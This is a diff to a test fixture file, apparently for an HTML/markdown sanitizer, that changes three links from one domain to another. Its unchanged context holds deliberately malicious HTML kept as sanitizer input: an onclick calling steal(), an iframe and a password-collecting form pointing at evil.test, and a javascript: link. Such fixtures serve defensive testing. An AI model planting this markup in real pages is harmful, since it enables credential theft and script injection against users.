@@ -50,7 +50,7 @@ export const MARKDOWN_SOURCE = [
 	'- check the pods',
 	'- check the logs',
 	'',
-	'See [the dashboard](https://ordinarylabs.com/dashboard).',
+	'See [the dashboard](https://dinary.app/dashboard).',
 	'',
 	'| Stage | Owner |',
 	'| --- | --- |',
@@ -74,14 +74,14 @@ export const HTML_REQUIRING_SANITIZATION = [
 	'<p onclick="steal()">All laptops use <strong>full disk</strong> encryption.</p>',
 	'<iframe src="https://evil.test/frame"></iframe>',
 	'<p><a href="javascript:alert(2)">do not click</a> and',
-	'<a href="https://ordinarylabs.com/policy" target="_blank">the real policy</a>.</p>',
+	'<a href="https://dinary.app/policy" target="_blank">the real policy</a>.</p>',
 	'<ul><li>Rotate keys quarterly</li><li>Enable MFA</li></ul>',
 	'<blockquote>Report incidents within one hour.</blockquote>',
 	'<pre><code>openssl rand -hex 32</code></pre>',
 	'<table><thead><tr><th>Control</th><th>Cadence</th></tr></thead>',
 	'<tbody><tr><td>Key rotation</td><td>Quarterly</td></tr></tbody></table>',
 	'<form action="https://evil.test/collect"><input name="password"></form>',
-	'<img src="https://ordinarylabs.com/logo.png" alt="logo">',
+	'<img src="https://dinary.app/logo.png" alt="logo">',
 	'</body></html>'
 ].join('\n');
 
